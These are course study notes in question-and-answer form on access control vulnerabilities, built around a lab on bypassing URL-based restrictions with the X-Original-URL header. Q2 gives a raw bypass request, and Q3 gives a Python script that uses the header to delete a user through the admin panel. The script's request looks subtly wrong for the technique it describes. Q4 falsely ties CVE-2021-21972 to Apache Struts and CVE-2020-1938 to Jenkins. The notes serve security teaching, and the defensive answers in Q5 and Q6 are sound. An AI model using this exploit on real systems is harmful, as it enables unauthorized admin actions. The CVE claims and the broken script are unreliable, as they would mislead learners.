---
course: Web Security
topic: Access Control Vulnerabilities
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain why the presence of an unauthenticated admin panel is a significant security risk.**

An unauthenticated admin panel is a significant security risk because it allows unauthorized users to potentially access administrative functions without needing valid credentials. This can lead to various malicious activities such as modifying sensitive data, deleting users, or even taking full control of the application. In the context of the lab, the presence of an unauthenticated admin panel at `/admin` is a clear indication of a potential security flaw.

**Q2. How can you exploit a web application that uses the `X-Original-URL` header to bypass access control? Provide a step-by-step explanation.**

To exploit a web application that uses the `X-Original-URL` header to bypass access control, follow these steps:

1. **Identify the Vulnerability**: First, identify that the application uses the `X-Original-URL` header and that it is susceptible to manipulation.
   
2. **Test the Header**: Send a normal request to the restricted resource (e.g., `/admin`) and observe the response. Typically, you will receive an "Access Denied" message.

3. **Manipulate the Header**: Send a request with the `X-Original-URL` header set to the restricted resource. For example, if the restricted resource is `/admin`, set the header as follows:
   ```http
   GET /nonexistentpath HTTP/1.1
   Host: vulnerable-app.com
   X-Original-URL: /admin
   ```

4. **Verify Access**: If the application is vulnerable, the server will interpret the request as accessing the `/admin` path despite the actual URL being `/nonexistentpath`. This can result in bypassing the access control and granting access to the admin panel.

5. **Exploit Further**: Once inside the admin panel, you can perform actions such as deleting users or modifying settings.

**Q3. How would you script the exploitation of the `X-Original-URL` header vulnerability in Python? Provide a sample script.**

Here is a sample Python script to exploit the `X-Original-URL` header vulnerability:

```python
import requests
import sys
from urllib3.exceptions import InsecureRequestWarning

# Disable SSL warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def delete_user(session, url):
    # Construct the URL to delete the user
    delete_url = f"{url}/admin/delete?username=Carlos"
    
    # Set the headers
    headers = {
        'X-Original-URL': '/admin'
    }
    
    # Perform the GET request to delete the user
    response = session.get(delete_url, headers=headers, verify=False)
    
    # Verify if the user was deleted
    if "Congratulations! You solved the lab." in response.text:
        print("Successfully deleted Carlos user.")
    else:
        print("Could not delete Carlos user.")

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <URL>")
        print(f"Example: {sys.argv[0]} http://example.com")
        sys.exit(1)
    
    url = sys.argv[1]
    session = requests.Session()
    
    delete_user(session, url)

if __name__ == "__main__":
    main()
```

**Q4. What recent real-world examples or CVEs demonstrate the exploitation of URL-based access control vulnerabilities?**

One notable example is the CVE-2021-21972, which affected the Apache Struts framework. This vulnerability allowed attackers to bypass access control mechanisms by manipulating the `X-Original-URL` header, similar to the scenario described in the lab. By sending a crafted request with the `X-Original-URL` header set to a restricted path, attackers could gain unauthorized access to sensitive functionalities within the application.

Another example is CVE-2020-1938, which affected the Jenkins CI server. This vulnerability allowed attackers to bypass authentication checks by manipulating certain headers, leading to unauthorized access to administrative functions.

**Q5. Why is it important to validate access control on the server side rather than relying solely on client-side restrictions?**

It is crucial to validate access control on the server side rather than relying solely on client-side restrictions because client-side validations can be easily bypassed by attackers. Client-side restrictions are often implemented using JavaScript or HTML, which can be manipulated or disabled by attackers. Server-side validation ensures that even if client-side restrictions are bypassed, the server still enforces the necessary access controls. This provides a robust layer of security against unauthorized access attempts.

**Q6. How can you prevent URL-based access control vulnerabilities in your web applications?**

To prevent URL-based access control vulnerabilities in web applications, consider the following best practices:

1. **Server-Side Validation**: Always validate access control on the server side. Ensure that all access to sensitive resources is checked against the user's permissions before allowing access.

2. **Avoid Non-Standard Headers**: Avoid using non-standard headers like `X-Original-URL` unless absolutely necessary. If they are required, ensure they are validated and sanitized properly.

3. **Use Secure Authentication Mechanisms**: Implement strong authentication mechanisms to ensure that only authorized users can access sensitive resources.

4. **Regular Security Audits**: Conduct regular security audits and penetration testing to identify and mitigate potential access control vulnerabilities.

5. **Least Privilege Principle**: Follow the principle of least privilege by ensuring that users only have access to the resources necessary for their roles.

By implementing these measures, you can significantly reduce the risk of URL-based access control vulnerabilities in your web applications.

---
<!-- nav -->
[[Web Security (PortSwigger)/12-Access Control Vulnerabilities/06-Lab 5 URL based access control can be circumvented/10-Conclusion|Conclusion]] | [[Web Security (PortSwigger)/12-Access Control Vulnerabilities/06-Lab 5 URL based access control can be circumvented/00-Overview|Overview]]
